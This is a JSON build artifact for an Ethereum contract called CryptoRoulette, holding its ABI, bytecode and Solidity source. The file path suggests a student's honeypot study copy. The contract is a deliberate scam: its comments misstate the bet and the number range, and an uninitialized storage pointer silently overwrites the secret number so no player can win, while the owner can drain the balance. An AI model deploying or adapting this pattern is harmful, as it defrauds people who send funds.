{
  "contractName": "CryptoRoulette",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "gamesPlayed",
      "outputs": [
        {
          "name": "player",
          "type": "address"
        },
        {
          "name": "number",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "ownerAddr",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "lastPlayed",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "betPrice",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "number",
          "type": "uint256"
        }
      ],
      "name": "play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405266038d7ea4c6800060025534801561001b57600080fd5b5033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610074610079640100000000026401000000009004565b610083565b6006600081905550565b610487806100926000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063382cf0a61461007a57806341c0e1b5146100ee5780636898f82b146101055780639c675eaa14610125578063c53391321461017c578063cfd8a175146101a7575b005b34801561008657600080fd5b506100a5600480360381019080803590602001909291905050506101d2565b604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390f35b3480156100fa57600080fd5b50610103610225565b005b610123600480360381019080803590602001909291905050506102a7565b005b34801561013157600080fd5b5061013a610429565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018857600080fd5b5061019161044f565b6040518082815260200191505060405180910390f35b3480156101b357600080fd5b506101bc610455565b6040518082815260200191505060405180910390f35b6004818154811015156101e157fe5b90600052602060002090600202016000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154905082565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614801561028757506154606001540142115b156102a5573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b600060025434101580156102bc5750600a8211155b15156102c757600080fd5b338160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550818160010181905550600481908060018154018082558091505090600182039060005260206000209060020201600090919290919091506000820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001820154816001015550505060005482141561041e573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561041c573d6000803e3d6000fd5b505b426001819055505050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600254815600a165627a7a72305820167536c9e15ca44445e704d8fdf4e7be01ce6d1c61df90c1ce5bf05729e4a0010029",
  "source": "/**\n *Submitted for verification at Etherscan.io on 2018-05-14\n https://etherscan.io/address/0x8685631276cfcf17a973d92f6dc11645e5158c0c#code\n*/\n\npragma solidity ^0.4.23;\n\n// CryptoRoulette\n//\n// Guess the number secretly stored in the blockchain and win the whole contract balance!\n// A new number is randomly chosen after each try.\n//\n// To play, call the play() method with the guessed number (1-16).  Bet price: 0.2 ether\n\ncontract CryptoRoulette {\n\n    uint256 private secretNumber;\n    uint256 public lastPlayed;\n    uint256 public betPrice = 0.001 ether;\n    address public ownerAddr;\n\n    struct Game {\n        address player;\n        uint256 number;\n    }\n    Game[] public gamesPlayed;\n\n    constructor() public {\n        ownerAddr = msg.sender;\n        shuffle();\n    }\n\n    function shuffle() internal {\n        // randomly set secretNumber with a value between 1 and 10\n        secretNumber = 6;\n    }\n\n    function play(uint256 number) payable public {\n        require(msg.value >= betPrice && number <= 10);\n\n        Game game;\n        game.player = msg.sender;\n        game.number = number;\n        gamesPlayed.push(game);\n\n        if (number == secretNumber) {\n            // win!\n            msg.sender.transfer(this.balance);\n        }\n\n        //shuffle();\n        lastPlayed = now;\n    }\n\n    function kill() public {\n        if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) {\n            suicide(msg.sender);\n        }\n    }\n\n    function() public payable { }\n}",
  "sourcePath": "/Users/student/Desktop/work/blockchainIntro/honeypot/contracts/rouletteHoneypot.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "3.3.4",
  "updatedAt": "2021-04-15T18:59:41.685Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}